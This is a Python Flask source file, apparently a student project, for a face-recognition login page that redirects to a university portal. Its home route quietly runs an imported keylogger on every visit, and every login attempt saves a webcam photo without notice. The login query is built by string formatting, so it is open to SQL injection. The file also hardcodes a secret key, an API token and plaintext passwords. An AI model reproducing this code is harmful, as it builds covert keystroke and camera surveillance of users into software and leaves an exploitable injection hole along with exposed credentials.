from flask import Flask, render_template, request, session, redirect, url_for
from keylogger import keylogger_main as Keylogger
import urllib.request, json
import sqlite3
import cv2
import numpy as np
import face_recognition
import os

app = Flask(__name__)
app.secret_key = 'secret_key'
app.database='data.db'
path = '.\Images'
cap = cv2.VideoCapture(0)
cnt=0

@app.route('/')
def home():
    Keylogger().run(5)
    if 'username' in session:
        return redirect('https://vtop.vit.ac.in/')
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    global cnt
    res, img = cap.read()
    if not res:
        print("failed to grab frame")
    cv2.imwrite('./unknown/unknown{}.jpg'.format(cnt), img)
    img = cv2.imread('./unknown/unknown{}.jpg'.format(cnt))
    cnt+=1
    cap.release()
    username = request.form['username']
    password = request.form['password']
    with sqlite3.connect(app.database) as connection:
        connection.row_factory = sqlite3.Row
        c = connection.cursor()
        c.execute("SELECT * FROM user WHERE username = '{}' AND password = '{}'".format(username, password))
        user = c.fetchone()
        name=""
        name=matchFace(img,encodeListKnown,classNames)
        # print(name)

        if user and name.lower()==username.lower():
            session['username'] = username
            session.pop('login_attempts', None)
            os.remove('./unknown/unknown{}.jpg'.format(cnt-1))
            cnt-=1
            return redirect('https://vtop.vit.ac.in/')
    
    if 'login_attempts' not in session:
        session['login_attempts'] = 1
    else:
        session['login_attempts'] += 1
    
    if session['login_attempts'] >= 3:
        session.clear()
        url="https://ipinfo.io/json?token=7ed2eada64c65a"
        response = urllib.request.urlopen(url)
        data = json.load(response)
        with sqlite3.connect(app.database) as connection:
            connection.row_factory = sqlite3.Row
            c = connection.cursor()
            c.execute("INSERT INTO ip VALUES(?, ?, ?, ?, ?, ?, ?, ?)", (data['ip'], data['city'], data['region'], data['timezone'], data['country'], data['loc'], data['postal'], data['org']))
            connection.commit()

        return 'Maximum login attempts reached. Please try again later.'
    
    return render_template('index.html', error='Invalid username or password.', login_attempts=session['login_attempts'])

@app.route('/logout')
def logout():
    session.pop('username', None)
    session.pop('login_attempts', None)
    return redirect(url_for('home'))

@app.route('/ip')
def ip():
    with sqlite3.connect(app.database) as connection:
        connection.row_factory = sqlite3.Row
        c = connection.cursor()
        c.execute("SELECT * FROM ip")
        ip=c.fetchall()
        ip = [dict(ix) for ix in ip]

    return render_template('ip.html', ips=ip)

def findEncodings(images):
    encodeList = []
    for img in images:
        img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
        encode = face_recognition.face_encodings(img)[0]
        encodeList.append(encode)
    return encodeList

def matchFace(img, encodeListKnown, classNames):
    facesCurFrame = face_recognition.face_locations(img)
    encodesCurFrame = face_recognition.face_encodings(img, facesCurFrame)

    for encodeFace, faceLoc in zip(encodesCurFrame, facesCurFrame):
        matches = face_recognition.compare_faces(encodeListKnown, encodeFace)
        faceDis = face_recognition.face_distance(encodeListKnown, encodeFace)
        # print(faceDis)
        matchIndex = np.argmin(faceDis)

        if matches[matchIndex]:
            name = classNames[matchIndex].upper()
        else:
            name = 'Unknown'

    return name

if __name__ == '__main__':
    if not os.path.exists(app.database):
        with sqlite3.connect(app.database) as connection:
            c = connection.cursor()
            c.execute("""CREATE TABLE ip(ip TEXT, city TEXT, region TEXT, timezone TEXT, country TEXT, loc TEXT, postal TEXT, org TEXT)""")
            c.execute("""CREATE TABLE user(username TEXT, password TEXT)""")
            c.execute('INSERT INTO user VALUES("admin", "password123")')
            c.execute('INSERT INTO user VALUES("Rishabh", "20bit0047")')
            connection.commit()

    images = []
    classNames = []
    myList = os.listdir(path)
    for cl in myList:
        curImg = cv2.imread(f'{path}/{cl}')
        images.append(curImg)
        classNames.append(os.path.splitext(cl)[0])
    encodeListKnown = findEncodings(images)
    app.run(debug=True)